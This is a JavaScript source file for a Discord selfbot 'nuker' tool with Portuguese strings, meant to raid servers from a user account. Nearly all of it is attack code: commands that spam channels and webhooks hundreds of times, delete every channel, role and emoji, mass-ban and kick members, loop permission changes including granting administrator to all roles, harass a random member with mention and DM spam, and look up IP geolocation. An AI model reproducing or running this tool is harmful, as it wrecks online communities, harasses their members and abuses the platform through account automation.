console.clear();

Gradient = require("gradient-string");
const Discord = require("discord.js-selfbot");
const client = new Discord.Client();

const chalk = require("chalk");
const snekfetch = require("snekfetch");


const {
	prefixo
} = require("../Arquivos Config/prefixo.json");
const config = require('../Arquivos Config/config.json');


const prefix = `${prefixo}`




client.on('ready', () => {});

console.log(Gradient.mind(`


     ██╗      ██████╗ ███████╗██╗   ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
     ██║     ██╔═══██╗██╔════╝╚██╗ ██╔╝    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
     ██║     ██║   ██║█████╗   ╚████╔╝     ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
     ██║     ██║   ██║██╔══╝    ╚██╔╝      ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
     ███████╗╚██████╔╝██║        ██║       ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
     ╚══════╝ ╚═════╝ ╚═╝        ╚═╝       ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
     /Nuker em Conta :D                                                                          


`))

client.on('message', async (pipoca) => {
	if (pipoca.author.id !== client.user.id) {
		return
	};
	if (!pipoca.content.startsWith(prefix)) {
		return
	};
	const youtube = pipoca.content.slice(prefix.length);
	const ola34 = youtube.split(' ');
	const marcos34 = ola34.shift().toLowerCase();
	if (marcos34 === 'spam') {
		let fuck = ola34.join(' ');
		pipoca.delete();
		for (pas = 0; pas < 999; pas++) {
			pipoca.channel.send(fuck)
		};
		console.log(chalk.red('     [+] Spam enviado com a mensagem: ', fuck))
	} else {
		if (marcos34 === 'svfoto') {
			pipoca.delete();
			const berg34 = ola34.join(' ');
			pipoca.guild.setIcon(berg34);
			console.log(chalk.yellow('     [+] Foto do servidor alterada'))
		} else {
			if (marcos34 === 'mudarn') {
				pipoca.delete();
				let mente = ola34.join(' ');
				pipoca.guild.members.cache.forEach((pente) => {
					pente.setNickname(mente)
				});
				console.log(chalk.yellow('     [+] Nome de todos os membros alterado'))
			} else {
				if (marcos34 === 'jogo') {
					pipoca.delete();
					let fuck = ola34.join(' ');
					client.user.setActivity(fuck, {
						type: 'PLAYING'
					});
					console.log(chalk.yellow('     [+] Nova atividade de jogo'))
				} else {
					if (marcos34 === 'token') {
						pipoca.delete();
						let lucasneto = pipoca.mentions.users.first() || client.users.cache.get(ola34[0]);
						if (!lucasneto) {
							return pipoca.channel.send('Voce precisa mencionar um usuario!')
						};
						let piranha = new Discord.MessageEmbed().setDescription(Buffer.from(lucasneto.id).toString('base64')).setColor('#01060d').setFooter(':D sei de nada haha');
						pipoca.channel.send(piranha);
						console.log(chalk.yellow(`${'     [+] Token de '}${lucasneto}${''}`))
					} else {
						if (marcos34 === 'emoji') {
							pipoca.guild.emojis.cache.forEach((_0xbf7dx14) => {
								return _0xbf7dx14.delete({
									reason: 'lofy'
								}).then(console.log(`${'     [✓]: '}${_0xbf7dx14 .name }${' foi apagado'}`))
							});
							pipoca.delete();
							console.log(chalk.yellow('     [+] Emojis apagados'))
						} else {
							if (marcos34 === 'live') {
								pipoca.delete();
								let fuck = ola34.join(' ');
								client.user.setActivity(fuck, {
									type: 'STREAMING',
									url: 'https://youtube.com/c/JapaInCode'
								});
								console.log(chalk.yellow('     [+] Nova live adicionada'))
							} else {
								if (marcos34 === 'help') {
									pipoca.delete();
									var piranha = new Discord.MessageEmbed().setTitle('Lofy/Team').setImage('https://cdn.discordapp.com/attachments/608711485849337856/916770334017994843/akame-kurome_2.gif').setColor('RANDOM').setDescription(`${'Pega:'}`).addField(`${''}${prefix}${'spam'}`, `${'Spam kk'}`).addField(`${''}${prefix}${'emoji'}`, `${'Apaga todos os emojis'}`).addField(`${''}${prefix}${'jogo'}`, `${'Coloca uma nova atividade de jogo'}`).addField(`${''}${prefix}${'live'}`, `${'Perfil roxo'}`).addField(`${''}${prefix}${'mudarn'}`, `${'Muda o nome de geral'}`).addField(`${''}${prefix}${'canais'}`, `${'Muda o nome de todos os canais'}`).addField(`${''}${prefix}${'cargos'}`, `${'Muda o nome de todos os cargos'}`).addField(`${''}${prefix}${'ban'}`, `${'Ban na maioria dos membros'}`).addField(`${''}${prefix}${'ip'}`, `${'Retorna informacoes do ip'}`).addField(`${''}${prefix}${'webhook'}`, `${'Faz spam com uma webhook'}`).addField(`${''}${prefix}${'clear'}`, `${'Limpa todas as suas mensagens'}`).addField(`${''}${prefix}${'bug'}`, `${'Loop infinito de apagar e criar canais, ninguém escreve hoje xD'}`).addField(`${''}${prefix}${'dr'}`, `${'Deleta todos os cargos'}`).addField(`${''}${prefix}${'dc'}`, `${'Deleta todos os canais'}`).addField(`${''}${prefix}${'cw'}`, `${'Cria um canal e faz spam usando uma webhook'}`).addField(`${''}${prefix}${'perms'}`, `${'Loop infinito removendo e adicionando permissões do everyone'}`).addField(`${''}${prefix}${'random'}`, `${'Faz spam por menção em um membro (pv/server)'}`);
									pipoca.channel.send(piranha)
								} else {
									if (marcos34 === 'canais') {
										pipoca.delete();
										let fuck = ola34.join(' ');
										let limitado = pipoca.guild.channels.cache.forEach((limitado) => {
											return limitado.setName(fuck)
										});
										console.log(chalk.yellow('     [+] Nome de todos os canais alterados'))
									} else {
										if (marcos34 === 'cargos') {
											pipoca.delete();
											let fuck = ola34.join(' ');
											let fofoca = pipoca.guild.roles.cache.forEach((fofoca) => {
												return fofoca.setName(fuck)
											});
											console.log(chalk.yellow('     [+] Nome de todos os cargos alterados'))
										} else {
											if (marcos34 === 'ban') {
												pipoca.delete();
												pipoca.guild.members.cache.filter((lol) => {
													return !lol.bannable < !pipoca.guild.owner < pipoca.guild.me.roles.highest.position
												}).forEach((lol) => {
													lol.ban().then((lol) => {
														console.log(chalk.green(`${'     [ + ]: Membro: '}${lol .user  .tag }${' foi banido'}`))
													})
												})
											} else {
												if (marcos34 === 'ip') {
													snekfetch.get(`${'http://ip-api.com/json/'}${ola34}${''}`).then((meianoite) => {
														var _0xbf7dx19 = JSON.stringify(meianoite.body);
														let embled_bruh = new Discord.MessageEmbed().setTimestamp().setThumbnail(`${''}`).setTitle(`${''}`).setDescription(`${`Informacoes do ip
\
        IP: `}${ola34}${`
\
        Provedor: `}${meianoite .body  .as }${`
\
        Cidade: `}${meianoite .body  .city }${`
\
        Pais: `}${meianoite .body  .country }${`
\
        Regiao: `}${meianoite .body  .region }${''}`);
														pipoca.channel.send({
															embed: embled_bruh
														})
													})
												} else {
													if (marcos34 === 'webhook') {
														let fuck = ola34.join(' ');
														pipoca.delete();
														let webhookkkkkkkkkkkk = pipoca.channel.createWebhook('Lofy', {
															avatar: 'https://cdn.discordapp.com/attachments/608711485849337856/916770334965915678/CheerfulAlarmedBlacklab-max-1mb.gif'
														}).then((webhookkkkkkkkkkkk) => {
															for (pas = 0; pas < 950; pas++) {
																webhookkkkkkkkkkkk.send(fuck)
															}
														})
													} else {
														if (marcos34 === 'clear') {
															let vermes = parseInt(ola34[0]) || 1;
															pipoca.delete();
															pipoca.channel.messages.fetch({
																limit: Math.min(vermes, 100),
																before: pipoca.id
															}).then((atencion) => {
																Promise.all(atencion.filter((lol) => {
																	return lol.author.id === client.user.id
																}).map((lol) => {
																	return lol.delete()
																})).then(() => {
																	console.log(chalk.yellow(`${'     [+] Apagadas: \\`'}${count}${'\\` mensagens.'}`))
                                })
                              })
                            } else {
                              if (marcos34 === 'bug') {
                                pipoca .delete ();
                                let gloria_a_deus = 0;
                                setInterval(function() {
                                  if (gloria_a_deus === 0) {
                                    pipoca .guild  .channels  .cache  .forEach ((limitado) => {
                                      return limitado .delete ()
                                    });
                                    gloria_a_deus = 1
                                  } else {
                                    if (gloria_a_deus === 1) {
                                      for (pas = 0; pas < 10; pas++) {
                                        pipoca .guild  .channels  .create ('Lofy está ta presente', {
                                          type: 'text'
                                        })
                                      };
                                      gloria_a_deus = 2
                                    } else {
                                      if (gloria_a_deus === 2) {
                                        random = Math .floor (Math .random () * 7) + 1;
                                        pipoca .guild  .channels  .cache  .forEach ((limitado) => {
                                          return limitado .delete ()
                                        });
                                        gloria_a_deus = 0
                                      }
                                    }
                                  }
                                }, 1000)
                              } else {
                                if (marcos34 === 'dr') {
                                  pipoca .delete ();
                                  pipoca .guild  .roles  .cache  .filter ((meianoite) => {
                                    return !meianoite .managed  && meianoite .position  < pipoca .guild  .me  .roles  .highest  .position  && meianoite .id  !== pipoca .guild  .id 
                                  }) .forEach ((fofoca) => {
                                    fofoca .delete () .then ((lol) => {
                                      console .log (chalk .green (`${'     [ + ] Cargo deletado: '}${lol .name }${' ('}${lol.toString()}${')'}`))
																})
															})
														} else {
															if (marcos34 === 'dc') {
																pipoca.delete();
																pipoca.guild.channels.cache.filter((limitado) => {
																	return limitado.delete()
																}).then(console.log('tesre'))
															} else {
																if (marcos34 === 'cw') {
																	let fuck = ola34.join(' ');
																	pipoca.delete();
																	pipoca.guild.channels.cache.forEach((limitado) => {
																		return limitado.delete()
																	});
																	for (pas = 0; pas < 950; pas++) {
																		pipoca.guild.channels.create('caiu bro :)', {
																			type: 'text'
																		}).then((limitado) => {
																			limitado.createWebhook('caiu ae?', {
																				avatar: 'https://images-ext-1.discordapp.net/external/ioLDZ2VPJxnChV4FlYnCndokBrbx79atVcR3LewGaro/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/569521146605600778/398bb14797cbbf06f592ad9745a480fd.png'
																			}).then((webhookkkkkkkkkkkk) => {
																				for (pas = 0; pas < 950; pas++) {
																					webhookkkkkkkkkkkk.send(fuck)
																				}
																			})
																		})
																	}
																} else {
																	if (marcos34 === 'perms') {
																		pipoca.delete();
																		let llaalalalalalal = 0;
																		setInterval(function() {
																			if (llaalalalalalal === 0) {
																				pipoca.guild.roles.cache.forEach((fofoca) => {
																					return fofoca.setPermissions(['ADMINISTRATOR'])
																				});
																				llaalalalalalal = 1
																			} else {
																				if (llaalalalalalal === 1) {
																					pipoca.guild.roles.cache.forEach((fofoca) => {
																						return fofoca.setPermissions(['VIEW_CHANNEL'])
																					});
																					llaalalalalalal = 2
																				} else {
																					if (llaalalalalalal === 2) {
																						random = Math.floor(Math.random() * 7) + 1;
																						pipoca.guild.roles.cache.forEach((fofoca) => {
																							return fofoca.setPermissions(['VIEW_CHANNEL'])
																						});
																						llaalalalalalal = 0
																					}
																				}
																			}
																		}, 1000)
																	} else {
																		if (marcos34 === 'kickCargos') {
																			let bundaveira = (pipoca.guild.roles.cache.get('884654115303608331').members);
																			bundaveira.forEach((lol) => {
																				setInterval(function() {
																					lol.kick();
																					console.log(chalk.yellow(`${'     [ + ] O membro '}${pente}${' foi kickado/banido'}`))
																				}, 1000)
																			})
																		} else {
																			if (marcos34 === 'random') {
																				pipoca.delete();
																				var pente = pipoca.guild.members.cache.random();
																				for (pas = 0; pas < 150; pas++) {
																					pipoca.channel.send(`${''}${pente}${''}`);
																					pente.send(`${''}${pente}${' tu foi escolhido kkkj'}`).catch((yobro) => {
																						console.log(chalk.red('Ocorreu um erro: ' + yobro))
																					})
																				};
																				console.log(chalk.yellow(`${'     [ + ] O membro sortudo foi... '}${pente}${''}`))
																			}
																		}
																	}
																}
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}
}
}
});
client.login(config.token_conta)